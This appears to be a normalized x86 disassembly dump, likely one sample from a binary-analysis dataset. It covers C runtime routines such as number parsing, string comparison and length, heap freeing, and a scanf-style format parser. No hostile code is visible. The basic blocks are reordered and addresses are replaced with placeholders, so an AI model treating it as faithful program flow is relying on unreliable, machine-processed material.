jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40989a
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_405072
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_4052e6
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_4050bb
add esp 0x14
pop ebp
retn
sub_405311
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_405072
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_405030
pop ecx
mov [ esi ] eax
pop esi
sub_40534b
push 0xc
push r--data
call sub_403d50
push 0xe
call sub_407a6d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4053b2
call sub_403d95
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_405311
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_405311
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_4053c0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_405450
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_4054db
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_4039d7
add esp 0xc
test eax eax
je r-xdata
call sub_40393d
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_409a00
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_405532
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_409db2
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_405568
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_409eb7
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_405552
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_405592
mov edi edi
push ebp
mov ebp esp
sub esp 0x200
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e8 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a4 ] eax
mov [ ebp - 0x1b0 ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1ec ] edi
mov [ ebp - 0x194 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4030d9
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1fc ]
call sub_404172
mov al [ esi ]
mov [ ebp - 0x1a5 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1cc ] edi
test al al
je r-xdata
push eax
call sub_408b66
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
mov edi esi
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1cc ]
mov eax [ ebp - 0x1f4 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a4 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_405568
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1bc ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_409eb7
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40a007
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_409769
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor eax eax
mov [ ebp - 0x1e4 ] eax
mov [ ebp - 0x1d1 ] al
mov [ ebp - 0x1ac ] eax
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1a8 ] al
mov [ ebp - 0x1a7 ] al
mov [ ebp - 0x19d ] al
mov [ ebp - 0x18d ] al
mov [ ebp - 0x1a6 ] al
mov [ ebp - 0x195 ] al
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1d8 ] eax
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40a007
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1bc ] edi
cmp ecx eax
jne r-xdata
cmp [ edi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1b8 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ edi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1b0 ]
call sub_405311
pop ecx
cmp [ edi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc edi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
movzx eax al
push eax
call sub_409eb7
pop ecx
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x1cc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1bc ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40a007
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_409db2
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x19d ] 0x0
mov [ ebp - 0x1bc ] edi
jne r-xdata
cmp [ ebp - 0x1f0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a5 ] al
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x19d ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e8 ]
mov esi [ eax ]
mov [ ebp - 0x200 ] eax
add eax 0x4
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1f4 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] esi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx ebx [ edi ]
or ebx 0x20
mov [ ebp - 0x1b4 ] ebx
cmp ebx 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b8 ]
test ecx ecx
je r-xdata
cmp ebx 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp ebx 0x6f
jg r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
cmp ebx 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
mov eax ebx
sub eax 0x70
je r-xdata
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov esi [ ebp - 0x1c0 ]
mov edi [ ebp - 0x1bc ]
push [ ebp - 0x1a4 ]
lea esi [ ebp - 0x18c ]
call sub_405568
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp ebx 0x63
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop eax
cmp ebx eax
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov edi esi
je r-xdata
mov [ ebp - 0x1a6 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1b8 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
mov edi [ ebp - 0x1e4 ]
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40a007
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp ebx 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a7 ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a7 ] 0x0
mov edi [ ebp - 0x1e4 ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a7 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec [ ebp - 0x1a5 ]
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp ebx 0x69
je r-xdata
cmp [ ebp - 0x1b4 ] 0x46
jne r-xdata
neg edi
movzx eax bl
push eax
call sub_409e36
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov ecx [ ebp - 0x1c4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1c8 ] eax
mov [ ebp - 0x1c4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_409e36
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x70
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp ebx 0x63
je r-xdata
cmp edi esi
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
cmp [ edi + 0x1 ] 0x5e
lea esi [ edi + 0x1 ]
jne r-xdata
mov [ ebp - 0x1a6 ] 0x1
mov edi [ ebp - 0x1bc ]
inc [ ebp - 0x1a5 ]
inc edi
mov [ ebp - 0x1bc ] edi
jmp r-xdata
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x1e8 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1b0 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1b4 ] eax
cmp ebx 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
push ebx
shl edi 0x4
call sub_405532
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_409db2
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x4
push ebx
shl esi 0x4
call sub_405532
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_409db2
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1a4 ]
push eax
call sub_40a007
pop ecx
pop ecx
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
cmp ebx 0x73
jne r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_409820
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x2 ]
mov [ ebp - 0x1a8 ] 0xff
cmp [ ebp - 0x1b8 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x19d ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40a007
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40a007
pop ecx
pop ecx
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp [ ebp - 0x1b4 ] 0x6f
jne r-xdata
inc edi
jmp r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
cmp ebx 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1cc ]
cmp ebx 0x63
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
cmp [ ebp - 0x1b8 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1cc ]
mov esi [ ebp - 0x1c0 ]
imul edi edi 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c4 ]
push [ ebp - 0x1c8 ]
call sub_409960
mov esi eax
mov edi edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_409769
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x1a8 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
mov ebx [ ebp - 0x1b4 ]
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a6 ] 0x0
je r-xdata
mov [ ebp - 0x1b4 ] 0x78
jmp r-xdata
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
cmp [ ebp - 0x1b4 ] 0x78
mov [ ebp - 0x1ac ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_409db2
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1b8 ] 0x0
lea edi [ edi + ebx - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b8 ] 0x0
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1c4 ] edi
je r-xdata
mov esi [ ebp - 0x1c8 ]
mov edi [ ebp - 0x1c4 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
lea eax [ ebp - 0x1fc ]
push eax
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1ec ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1ec ]
push eax
call sub_40a0ea
mov ax [ ebp - 0x1ec ]
add esp 0x10
mov [ esi ] ax
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x1df ] al
mov eax [ ebp - 0x1c0 ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1c0 ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1b8 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1fc ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a8 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1c0 ] esi
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a4 ]
push ebx
call sub_40a007
pop ecx
pop ecx
mov [ ebp - 0x1b4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
mov ebx [ ebp - 0x1b4 ]
test dl dl
je r-xdata
mov [ ebp - 0x1bc ] esi
mov esi [ ebp - 0x1c0 ]
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1b0 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov [ ebp - 0x194 ] ebx
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a4 ]
inc [ ebp - 0x18c ]
call sub_405552
mov ecx [ ebp - 0x1b0 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1b0 ]
lea esi [ ebp - 0x1dc ]
call sub_4054db
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a4 ]
push [ ebp - 0x194 ]
call sub_40a007
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x19d ] 0x0
jne r-xdata
